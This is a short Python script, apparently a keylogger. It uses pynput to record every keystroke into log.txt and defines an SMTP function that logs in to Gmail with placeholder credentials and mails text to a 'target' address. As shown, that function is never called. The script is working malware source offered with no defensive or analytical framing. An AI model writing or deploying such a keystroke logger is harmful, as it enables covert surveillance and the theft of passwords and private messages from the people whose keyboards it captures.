import smtplib
from pynput import keyboard

# Set up the email credentials
EMAIL_ADDRESS = 'Your Email Address'
EMAIL_PASSWORD = 'Your Password'
RECEIVER_ADDRESS = 'Target email address'

# Create a function to send an email
def send_email(subject, body):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        message = f'Subject: {subject}\n\n{body}'
        server.sendmail(EMAIL_ADDRESS, RECEIVER_ADDRESS, message)
        server.quit()
        print('Email sent successfully.')
    except:
        print('Failed to send email.')

# Create a function to log the keystrokes
def on_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            current_key = " "
        else:
            current_key = f' {key} '
    with open("log.txt", "a") as file:
        file.write(current_key)

# Set up the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
